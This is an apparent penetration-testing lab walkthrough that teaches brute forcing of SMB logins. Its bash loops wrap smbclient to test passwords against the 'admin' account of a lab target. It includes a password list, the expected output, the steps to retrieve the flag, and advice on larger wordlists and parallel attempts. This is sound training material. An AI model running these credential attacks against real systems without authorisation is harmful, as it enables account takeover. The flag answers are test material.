# Exercise 3.2: Multiple Credential Testing

## Before You Begin

In Exercise 3.1, you tested a single username-password pair. That worked because the password was obvious. In practice, you rarely guess the right password on the first try. this exercise teaches you to script multiple password tests using bash loops; a skill that applies to any protocol, not just SMB.

Your VPN must be connected and your terminal open. You should be comfortable with the `smbclient` syntax from Exercise 3.1 before continuing.

## Scenario

Manual testing in Exercise 3.1 worked, but testing one password at a time is impractical when you have a list of common passwords to try. James Mitchell, the IT Director at FinanceCorp, wants you to demonstrate a faster approach. The target has an SMB share called "private" that requires authentication. Your job is to find valid credentials by testing a list of common passwords against the known username `admin`.

## Your Objectives

- Test multiple passwords against the SMB service using a bash loop
- Write bash scripts that automate credential testing
- Identify valid credentials from the output of multiple attempts
- Authenticate with the discovered credentials and capture the flag

---

## Background: Scaling Up: From One Test to Many

In Exercise 3.1, you tested one username and one password. That is fine for a single guess, but real engagements require testing dozens or hundreds of candidates. There are three distinct strategies for credential attacks, and understanding the differences matters:

**Brute force**: test many passwords against a single user account. Brute force is the most direct approach, but it carries the highest risk. If the target has an account lockout policy, your target account gets locked after a handful of failures.

**Password spraying**: test one password against many user accounts. Spraying is safer because you spread your attempts across accounts. If the lockout threshold is 5 failures per account, you can test 4 passwords per account without triggering a lockout. Password spraying is the preferred technique in most real engagements.

**Credential stuffing**: test username:password pairs from leaked databases. If a user reused a password from a previous breach, this finds it. You are not guessing; you are replaying known credentials from other sites.

Account lockout policies are the primary defense against brute force attacks. Many systems lock an account after N failed attempts (commonly 3 to 5) for a set duration. Password spraying avoids this by never testing more than a few passwords per account. Always consider lockout policies before running any credential attack.

For this exercise, you are performing a vertical brute force: many passwords against one known user (`admin`). The lab environment does not enforce account lockout, so you can test freely.

## Tool Primer: Bash `for` Loop for Credential Testing

Bash `for` loops let you repeat a command with different values; in this case, different passwords. You already know the `smbclient` syntax from Exercise 3.1. Now you wrap it in a loop.

**Basic syntax:**

!!! kali "Loop through passwords against IPC$"
    The loop iterates through a hardcoded list of passwords, echoing each attempt and feeding it to smbclient.

    ```bash
    for pass in password admin admin123 password123 123456; do
      echo "Testing: admin / $pass"
      smbclient //<target_ip>/IPC$ -U "admin%$pass" -c 'exit' 2>&1
    done
    ```

    Watch for any attempt that does not return `NT_STATUS_LOGON_FAILURE`; that is your valid password.

Here is what each component does:

- `for pass in ...`: the loop iterates through each word after `in`, storing the current word in the variable `pass`
- `smbclient //<target_ip>/IPC$`: attempts an SMB connection to the IPC$ share, which every Windows machine exposes. You use IPC$ to test credentials without needing to know a specific share name
- `-U "admin%$pass"`: passes the username and password in `user%password` format. The `$pass` variable is replaced with the current password from the loop
- `-c 'exit'`: tells smbclient to disconnect immediately after authenticating. You only care whether the login succeeded, not about browsing files
- `2>&1`: redirects stderr to stdout so you can capture all output, including error messages like `NT_STATUS_LOGON_FAILURE`

**Improved version with success detection:**

!!! kali "Loop with automatic success detection"
    Adding a `grep` check turns the raw output into a clear pass or fail verdict per password.

    ```bash
    for pass in password admin admin123 password123 123456; do
      result=$(smbclient //<target_ip>/IPC$ -U "admin%$pass" -c 'exit' 2>&1)
      if echo "$result" | grep -q "NT_STATUS_LOGON_FAILURE"; then
        echo "[-] Failed: admin / $pass"
      else
        echo "[+] SUCCESS: admin / $pass"
      fi
    done
    ```

    The improved loop version captures the smbclient output into a variable and checks it for the `NT_STATUS_LOGON_FAILURE` string. If that string is present, the login failed. If it is absent, the login succeeded. The `grep -q` flag suppresses output; grep just sets the exit code, and the `if` statement checks it.

**Reading passwords from a file:**

!!! kali "Read passwords from a file"
    For larger lists, drive the loop from a file instead of an inline word list.

    ```bash
    while read pass; do
      smbclient //<target_ip>/IPC$ -U "admin%$pass" -c 'exit' 2>&1 | \
        grep -q "NT_STATUS_LOGON_FAILURE" || echo "[+] Valid: admin/$pass"
    done < passwords.txt
    ```

    The file-reading version uses `while read` to process a file line by line. The `||` operator is a shortcut that means "if the previous command failed (grep did not find the failure string), run the next command." In plain English: if there is no logon failure, print the credentials as valid.

---

## Walkthrough

### Step 1: Launch the Exercise

Open the platform in your browser and start the exercise environment.

- Navigate to **Exercises** and locate the Multiple Credential Testing lab
- Click **Launch** and wait for the status to change to **Running**
- Note the **target IP** displayed in the Active Lab View

### Step 2: Create a Password List

!!! kali "Create the password list"
    Rather than typing passwords directly into the loop, create a file containing common passwords. Run this command in your terminal:

    ```bash
    cat > passwords.txt << 'EOF'
    password
    admin
    admin123
    password123
    123456
    letmein
    welcome
    qwerty
    EOF
    ```

    The heredoc creates a file called `passwords.txt` with eight common passwords, one per line. In a real engagement, your password list would be much larger, but eight entries are enough to demonstrate the technique.

### Step 3: Run the Credential Testing Loop

!!! kali "Run the credential testing loop"
    Now run the improved loop with success detection. Replace `<target_ip>` with the IP from the Active Lab View:

    ```bash
    for pass in $(cat passwords.txt); do
      result=$(smbclient //<target_ip>/IPC$ -U "admin%$pass" -c 'exit' 2>&1)
      if echo "$result" | grep -q "NT_STATUS_LOGON_FAILURE"; then
        echo "[-] Failed: admin / $pass"
      else
        echo "[+] SUCCESS: admin / $pass"
      fi
    done
    ```

    Most lines report a failure; one line reports success for the valid password.

### Step 4: Review the Output

Watch the terminal as the loop runs. Most lines show `[-] Failed`, indicating invalid passwords. One line shows `[+] SUCCESS` for the password `admin123`. Your output should look similar to this:

```
[-] Failed: admin / password
[-] Failed: admin / admin
[+] SUCCESS: admin / admin123
[-] Failed: admin / password123
[-] Failed: admin / 123456
[-] Failed: admin / letmein
[-] Failed: admin / welcome
[-] Failed: admin / qwerty
```

The valid credentials are `admin` / `admin123`.

### Step 5: Authenticate to the Private Share

!!! kali "Authenticate with the discovered credentials"
    Use the discovered credentials to connect to the "private" share:

    ```bash
    smbclient //<target_ip>/private -U admin%admin123
    ```

    You should see the `smb: \>` prompt, confirming successful authentication.

### Step 6: Download the Flag

!!! kali "List and download the flag file"
    List the contents of the share and download the flag file:

    ```
    smb: \> ls
    smb: \> get flag.txt
    smb: \> exit
    ```

    The `flag.txt` file lands in your current working directory on Kali.

### Step 7: Read the Flag

!!! kali "Read the downloaded flag"
    Back at your terminal, read the downloaded file:

    ```bash
    cat flag.txt
    ```

    The flag is in `OCR{<flag_here>}` format.

    Paste this into the **Submit Flag** form on the platform and click **Submit**.

---

### Record Your Findings

> **Password list used:**
>
> ```
> (paste the contents of your passwords.txt here)
> ```
>
> **Test results:**
>
> | Password Tested | Result (Success/Failure) |
> |-----------------|--------------------------|
> |                 |                          |
> |                 |                          |
> |                 |                          |
> |                 |                          |
> |                 |                          |
> |                 |                          |
> |                 |                          |
> |                 |                          |
>
> **Discovered credentials:** ___________________________
>
> **How to submit:** enter the flag on the exercise page exactly as you recovered it, keeping the `OCR{...}` wrapper.
>
> **Flag:** ___________________________

---

## Analysis Questions

Take a moment to think through these questions. They reinforce concepts you will need in later exercises.

**1. You tested 8 passwords against one user. If FinanceCorp had an account lockout policy of 5 failed attempts, what would have happened?**

??? note "Reveal Answer"

    The account would have been locked out after the 5th failed attempt. Your loop would continue testing the remaining passwords, but every attempt after lockout would fail regardless of whether the password was correct. You would need to wait for the lockout timer to expire or try a different approach entirely. The lockout risk is why password spraying (one password across many users) is preferred in real engagements.

**2. Your bash loop tests passwords sequentially. How could you make the test faster?**

??? note "Reveal Answer"

    You could run multiple smbclient connections in parallel using background processes (`&`) or tools like `xargs -P`. However, faster testing generates more network noise and increases the risk of triggering account lockout or intrusion detection systems. Dedicated tools like CrackMapExec (Exercise 3.3) handle parallelism automatically and provide cleaner output than hand-written bash.

**3. You created a custom password list with 8 entries. Where would you find larger, more complete wordlists for a real engagement?**

??? note "Reveal Answer"

    Kali Linux includes wordlists at `/usr/share/wordlists/`: most notably `rockyou.txt`, which contains roughly 14 million passwords from a real data breach. SecLists (available on GitHub) provides categorized password lists organized by type, length, and context. You can also create custom lists based on the target organization's name, year, and common patterns (e.g., `FinanceCorp2024`, `Finance2024#`).

---

## Key Takeaways

- Bash `for` loops automate repetitive credential testing across any protocol
- Success detection works by checking for the absence of `NT_STATUS_LOGON_FAILURE` in the smbclient output
- Custom password lists should include defaults, keyboard patterns, and company-specific guesses
- Account lockout policies are the primary defense against brute force; always consider them before testing
- Bash loops work, but they are slow and fragile. The next exercise introduces CrackMapExec; a purpose-built tool that handles SMB brute force faster, with better output, and native SMBv2/v3 support
